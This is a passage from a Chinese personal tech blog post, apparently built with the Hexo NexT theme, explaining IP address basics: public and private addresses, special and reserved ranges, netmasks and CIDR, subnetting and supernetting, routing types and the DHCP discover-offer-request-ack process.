+<h3 id="公有和私有-IP-地址"><a href="#公有和私有-IP-地址" class="headerlink" title="公有和私有 IP 地址"></a>公有和私有 IP 地址</h3><p>公共 IP 地址：互联网上设备拥有的唯一地址。</p>
+<p>私有 IP 地址：不直接用于互联网，通常在局域网中使用。</p>
+<img data-src="//img.to2b.cn/blog/ljk/1598365287677.png" style="zoom: 68%;" />
+
+<img data-src="//img.to2b.cn/blog/ljk/1598365326536.png" style="zoom: 63%;" />
+
+<h3 id="特殊地址"><a href="#特殊地址" class="headerlink" title="特殊地址"></a>特殊地址</h3><ul>
+<li><p>0.0.0.0：不是一个真正意义上的 IP 地址。它表示 <strong>所有不清楚的主机和目的网络</strong></p>
+</li>
+<li><p>255.255.255.255：限制广播地址，对本机来说，这个地址指本网段内(同一广播域)的所有主机</p>
+</li>
+<li><p>127.0.0.1 ～ 127.255.255.254</p>
+<p>本机回环地址，主要用于测试。在传输介质上永远不应该出现目的地址为“127.0.0.1”的 数据包</p>
+</li>
+<li><p>224.0.0.0 到 239.255.255.255</p>
+<p>组播地址，224.0.0.1 特指所有主机，224.0.0.2 特指所有路由器。224.0.0.5 指 OSPF 路由器，地址多用于一些特定的程序以及多媒体程序</p>
+<p>前 4 比特固定为 1110，后 28 比特是组播组地址标识(ID)</p>
+<p>如果想接收组播，主机必须加入到对应的组播组中，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP%2FIP/214077">TCP&#x2F;IP</a>的套接字(socket) API 提供了相应的方法。当一台主机加入一个组播组后，它既有一个本机的 IP 地址，同时也有一个组播组的 D 类 IP 地址，对于目的地址是这两个地址的 IP 数据报，这台主机都会接收。</p>
+<p>一台主机可以随时加入或离开一个组播组，也可以同时属于多个组播组。一台主机可以向任何一个组播组发送 IP 组播数据报，即使这台主机不是这个组播组的成员。</p>
+<p>由于 D 类 IP 地址有 268*435*456 个，因此 IP 协议允许有 2 亿 6 干多万个组播，可以提供非常丰富的组播服务</p>
+</li>
+<li><p>169.254.x.x</p>
+<p>如果 Windows 主机使用了 DHCP 自动分配 IP 地址，而又无法从 DHCP 服务器获取地址，系统会为主机分配这样地址</p>
+</li>
+</ul>
+<h3 id="保留地址"><a href="#保留地址" class="headerlink" title="保留地址"></a>保留地址</h3><p>用 32 位二进制表示的 ip，主机 ID 位全是 0 和全是 1 的情况，保留。例如 172.16.0.0 网段中，172.16.0.0 和 172.16.255.255 是保留地址。</p>
+<h3 id="子网掩码-netmask"><a href="#子网掩码-netmask" class="headerlink" title="子网掩码 netmask"></a>子网掩码 netmask</h3><p>CIDR：无类域间路由，目前的路由已不再按 A、B、C 类划分网段，而是可以指定网段的范围。</p>
+<p>CIDR 表示法：IP&#x2F;网络 ID 位数，例如：172.16.0.100&#x2F;16</p>
+<p>netmask 子网掩码：32 位或 128 位（IPv6）的二进制数字，和 IP 成对使用，用来表示前几位是网络 ID，网络 ID 位全是 1，主机位全是 0。例如 255.255.255.0，前 24 位是网络 ID。</p>
+<img data-src="//img.to2b.cn/blog/ljk/1616987648967.png" style="zoom:80%;" />
+
+<h4 id="判断对方主机是否在同一网段："><a href="#判断对方主机是否在同一网段：" class="headerlink" title="判断对方主机是否在同一网段："></a>判断对方主机是否在同一网段：</h4><p>用自已的子网掩码分别和自已的 IP 及对方的 IP 相与，比较结果，相同则同一网段，不同则不同网段。不同的网段是不能通信的。</p>
+<h3 id="划分子网-Subnet"><a href="#划分子网-Subnet" class="headerlink" title="划分子网 Subnet"></a>划分子网 Subnet</h3><p>划分子网：将一个大的网络（主机数多）划分成多个小的网络（主机数少），网络 ID 位向主机 ID 位借位，主机 ID 位数变少，网络 ID 位数变多。</p>
+<h3 id="优化-IP-地址分配"><a href="#优化-IP-地址分配" class="headerlink" title="优化 IP 地址分配"></a>优化 IP 地址分配</h3><p>合并超网：将多个小网络合并成一个大网，主机 ID 位向网络位借位。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 8个C类网段</span>
+<span class="token number">220.78</span>.168.0/24
+<span class="token number">220.78</span>.169.0/24
+<span class="token number">220.78</span>.170.0/24
+<span class="token number">220.78</span>.171.0/24
+<span class="token number">220.78</span>.172.0/24
+<span class="token number">220.78</span>.173.0/24
+<span class="token number">220.78</span>.174.0/24
+<span class="token number">220.78</span>.175.0/24
+<span class="token number">220.78</span>.10101 000.0  <span class="token number">220.78</span>.168.0/24
+<span class="token number">220.78</span>.10101 001.0  <span class="token number">220.78</span>.169.0/24
+<span class="token number">220.78</span>.10101 010.0  <span class="token number">220.78</span>.170.0/24
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
+<span class="token number">220.78</span>.10101 <span class="token number">110.0</span>  <span class="token number">220.78</span>.174.0/24
+<span class="token number">220.78</span>.10101 <span class="token number">111.0</span>  <span class="token number">220.78</span>.175.0/24
+
+<span class="token comment"># 合并成</span>
+<span class="token number">220.78</span>.168.0/21</code></pre>
+
+<h3 id="跨网络通信"><a href="#跨网络通信" class="headerlink" title="跨网络通信"></a>跨网络通信</h3><p>跨网络通信：路由、选择路径</p>
+<p>路由分类：主机路由、网络路由、默认路由</p>
+<h3 id="动态主机配置协议-DHCP"><a href="#动态主机配置协议-DHCP" class="headerlink" title="动态主机配置协议 DHCP"></a>动态主机配置协议 DHCP</h3><img data-src="//img.to2b.cn/blog/ljk/1598406043275.png" style="zoom:50%;" />
+
+<p>自定获取 IP 地址，需要在网络中有 DHCP 服务器，服务器上有地址池，维护很多地址。自动获取 IP 地址步骤分四步：discover­ &gt; offer­ &gt; request­ &gt; ack(nak)</p>
+<img data-src="//img.to2b.cn/blog/ljk/1598407472082.png" style="zoom:67%;" />
+
+<ol>
+<li>DHCP <strong>DISCOVER</strong>: 寻找服务器，向网络中发送 DHCP DISCOVER 协议广播（来源地址：0.0.0.0），请求 DHCP 给分配 IP 地址。</li>
+<li>DHCP <strong>OFFER</strong>：分配 IP 地址，DHCP 服务器接收到请求，返回 IP 地址，同时在地址池中标记该 IP 地址。</li>
+<li>DHCP <strong>REQUEST</strong>：请求使用，如果客户端收到网路上多台 DHCP 服务器的回应﹐只会挑选其中一个 DHCP Offer(通常是最先抵达的那个)并且向网路发送一个 DHCP Request 广播，告诉所有 DHCP 服务器它将指定接受哪一台服务器提供的 IP 位址，除 DHCP 客户机选中的服务器外，其他的 DHCP 服务器都将收回曾提供的 IP 地址。<ol>
+<li>同时，客户端还会发送一个 ARP 封包， 查询网路上有没有其他机器使用该 IP 地址， 如果发现该 IP 被占用， 客户端会发送一个 DHCP Decline 封包给 DHCP 服务器， 拒绝接受其 DHCP Offer，并重新开始发送 DHCP Discover 信息。</li>
+</ol>
+</li>
+<li>DHCP <strong>ACK</strong> IP：地址分配确认，DHCP 服务器收到 DHCP Request 请求信息之后，发送 ACK 确认确认 IP 地址的正式生效，然后客户单便将其 TCP&#x2F;IP 协议与网卡绑定</li>
+</ol>
+<p>DHCP 服务器向 DHCP 客户机出租的 IP 地址一般都有一个租借期限， 期满后 DHCP 服务器便会收回出租的 IP 地址，如果 DHCP 客户机要延长其 IP 租约， 则必须更新其 IP 租约：租赁时间到达 50%时续租，如果 DHCP Server 没有回应，等到租期的 7&#x2F;8 时，主机会再发送一次广播请求。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="//img.to2b.cn/blog/ljk/1607160536339.png" alt="像方便面一样的男子 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="//img.to2b.cn/blog/ljk/1607160019009.png" alt="像方便面一样的男子 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag"><i class="fa fa-tag"></i> 网络</a>
+              <a href="/tags/TCP-IP/" rel="tag"><i class="fa fa-tag"></i> TCP/IP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/TCP%E6%B3%A8%E5%86%8C%E7%AB%AF%E5%8F%A3%E5%8F%B7%E5%A4%A7%E5%85%A8/" rel="prev" title="TCP注册端口号大全">
+                  <i class="fa fa-chevron-left"></i> TCP注册端口号大全
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/" rel="next" title="网络相关命令">
+                  网络相关命令 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">鲁ICP备18016600号-1 </a>
+  </div>
+
+<div class="copyright">
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">像方便面一样的男子</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="//s1.to2b.cn/libs/animejs/3.2.1/anime.min.js"></script>
+  <script src="//s1.to2b.cn/libs/lozad.js/1.16.0/lozad.min.js"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="//s1.to2b.cn/libs/algoliasearch/4.11.0/algoliasearch-lite.umd.min.js"></script>
+<script src="//s1.to2b.cn/libs/instantsearch.js/4.36.0/instantsearch.production.min.js"></script><script src="/js/third-party/search/algolia-search.js"></script>
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
